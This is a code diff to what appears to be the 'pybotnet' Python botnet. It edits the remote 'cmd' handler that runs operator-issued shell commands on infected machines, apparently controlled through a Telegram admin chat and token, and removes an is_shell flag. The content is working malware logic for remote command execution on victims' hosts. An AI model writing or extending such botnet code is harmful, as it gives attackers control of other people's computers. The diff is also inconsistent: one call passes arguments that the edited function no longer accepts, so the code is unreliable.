@@ -140,7 +140,7 @@ def execute_scripts(command: str, pybotnet_up_time: int, is_shell: bool, ADMIN_C
                 return get_info(pybotnet_up_time, logger)
 
             elif command_name == 'cmd':
-                return execute_cmd(command, is_shell, logger)
+                return execute_cmd(command, is_shell,ADMIN_CHAT_ID, TELEGRAM_TOKEN, logger)
 
             elif command_name == 'ls':
                 return execute_ls(command, logger)
@@ -283,8 +283,8 @@ def clean_shell_data(output):
     return output
 
 
-def cmd(command: list, is_shell: bool, logger):
-    '''run code on terminal'''
+def cmd(command: list, logger):
+    '''Runs cmd commands.'''
 
     if command[0] == 'ls':
         logger.info('redirect to execute_ls')
@@ -296,22 +296,21 @@ def cmd(command: list, is_shell: bool, logger):
 
     logger.info(f'try to run: {command}')
 
-    if not is_shell or command[0] in ['mkdir', 'touch', 'rm', 'rmdir']:
+    if command[0] in ['mkdir', 'touch', 'rm', 'rmdir']:
         os_result = os.system(' '.join(command))
-        add_on_message = ''
-        if not is_shell:
-            add_on_message = '''\n
-you compile app noconsole (is_shell = False)
-That\'s why I can\'t get the output text by `cmd` command'''
+        add_on_message = '''Done !'''
 
         return f'output code "{os_result}", {add_on_message}'
 
     else:
-        result = subprocess.getoutput(' '.join(command))
+        # Everything starts from here.
+        executecode = util.execute_commands(' '.join(command))
+        result = executecode.runcommand()
         return clean_shell_data(result)
 
 
-def execute_cmd(command: str, is_shell: bool, logger) -> str:
+def execute_cmd(command: str,logger) -> str:
+    #FIXME : is_shell Is not needed !!! Delete It From the Whole Program!!!
     try:
         command = split_command(command)
         if command[0] == 'cmd':
@@ -321,7 +320,7 @@ def execute_cmd(command: str, is_shell: bool, logger) -> str:
         return f'execute_cmd invalid command; Wrong format: {error}'
 
     try:
-        return cmd(command, is_shell, logger=logger)
+        return cmd(command,logger=logger)
 
     except OverflowError as error:
         return f'cmd {error}'
